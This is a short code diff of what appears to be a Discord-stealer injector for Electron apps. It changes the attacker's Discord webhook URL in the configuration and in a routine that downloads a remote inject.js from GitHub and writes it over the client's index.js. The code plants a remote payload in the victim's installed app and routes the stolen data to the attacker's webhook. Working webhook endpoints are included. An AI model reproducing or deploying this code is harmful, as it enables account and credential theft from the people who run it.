@@ -12,7 +12,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1400181802936832131/4m7mEle9gDibLOVWNkFVy6_gF0Ta2m0k_6P3M9ptGmpNRWRHu6QQOKGr32YrrkQLr1KH",
+    webhook: "https://discord.com/api/webhooks/1400537394427461662/1N-fuV-35eGfV-z1m0jpJofi82h6iIu6lAzHREC5C80xNR4GpHzXKRzer_AdQJfLxp2O",
     injection_url: "https://raw.githubusercontent.com/tabo1337/plague/refs/heads/main/inject.js",
     filters: {
         urls: [
@@ -609,7 +609,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('https://discord.com/api/webhooks/1400181802936832131/4m7mEle9gDibLOVWNkFVy6_gF0Ta2m0k_6P3M9ptGmpNRWRHu6QQOKGr32YrrkQLr1KH', '${CONFIG.webhook}')
+          res.replace('https://discord.com/api/webhooks/1400537394427461662/1N-fuV-35eGfV-z1m0jpJofi82h6iIu6lAzHREC5C80xNR4GpHzXKRzer_AdQJfLxp2O', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
